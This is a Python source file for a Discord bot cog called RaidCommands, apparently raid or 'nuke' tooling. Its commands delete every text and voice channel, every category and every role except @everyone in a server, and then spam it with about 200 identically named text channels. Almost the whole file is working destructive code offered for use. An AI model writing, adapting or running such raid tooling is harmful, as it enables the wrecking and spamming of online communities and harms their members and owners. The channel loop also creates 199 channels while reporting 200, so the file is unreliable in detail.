import discord
from discord.ext import commands

class RaidCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def channelraid(self, ctx):
        """Delete all channels the bot has access to."""
        try:
            if not ctx.author.guild_permissions.administrator:
                await ctx.send("You do not have permission to delete channels!")
                return

            for c in ctx.guild.channels:
                if isinstance(c, discord.TextChannel) or isinstance(c, discord.VoiceChannel):
                    await c.delete()
            await ctx.send("All channels have been deleted.")
        except Exception as e:
            await ctx.send(f"Failed to delete channels: {e}")

    @commands.command()
    async def categoryraid(self, ctx):
        try:
            if not ctx.author.guild_permissions.administrator:
                await ctx.send("You do not have permission to delete categories!")
                return

            for category in ctx.guild.categories:
                await category.delete()

            await ctx.send("All categories have been deleted.")
        except Exception as e:
            await ctx.send(f"Failed to delete categories: {e}")

    @commands.command()
    async def delete_roles(self, ctx):
        try:
            if not ctx.author.guild_permissions.administrator:
                await ctx.send("You do not have permission to delete roles!")
                return

            for role in ctx.guild.roles:
                if role.name != "@everyone":
                    await role.delete()

            await ctx.send("All roles (except @everyone) have been deleted.")
        except Exception as e:
            await ctx.send(f"Failed to delete roles: {e}")

    @commands.command()
    async def create_channels(self, ctx, *, channel_name: str):
        try:
            if not ctx.author.guild_permissions.administrator:
                await ctx.send("You do not have permission to create channels!")
                return

            for i in range(1, 200):
                await ctx.guild.create_text_channel(f"{channel_name}")

            await ctx.send(f"200 channels created!")
        except Exception as e:
            await ctx.send(f"Failed to create channels: {e}")

def setup(bot):
    bot.add_cog(RaidCommands(bot))
